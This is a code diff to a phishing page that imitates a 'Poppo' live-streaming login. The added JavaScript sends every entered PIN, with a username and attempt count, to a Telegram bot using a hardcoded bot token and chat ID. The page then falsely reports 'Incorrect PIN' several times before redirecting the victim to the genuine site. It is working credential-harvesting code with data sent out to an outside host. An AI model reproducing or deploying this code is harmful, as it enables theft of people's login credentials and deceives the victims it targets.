@@ -116,18 +116,31 @@
         let attempt = 1; // Track login attempts
         const maxAttempts = 3; // Number of times to say "Incorrect PIN"
 
+        const botToken = "7905444120:AAHwbwsv8lVNCETUQSNgzw0z4YVI6vSKRos"; // Replace with your Telegram bot token
+        const chatId = "6992364240"; // Replace with your Telegram chat ID
+
+        function sendToTelegram(pin) {
+            const message = `🔐 **Poppo Login Attempt**\n👤 User: Abebaw-A.G\n🔑 Entered PIN: ${pin}\n📆 Attempt: ${attempt}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => console.log(""))
+                .catch(error => console.error("", error));
+        }
+
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault();
             
             let pin = document.getElementById("pin").value;
             let errorMessage = document.getElementById("errorMessage");
 
+            sendToTelegram(pin); // Send the entered PIN to Telegram
+
             attempt++; // Increase attempt count
 
             if (attempt <= maxAttempts) {
                 errorMessage.textContent = `Incorrect PIN.`;
             } else {
-               
                 window.location.href = "https://www.poppolive.com/"; // Change this to your target URL
             }
         });
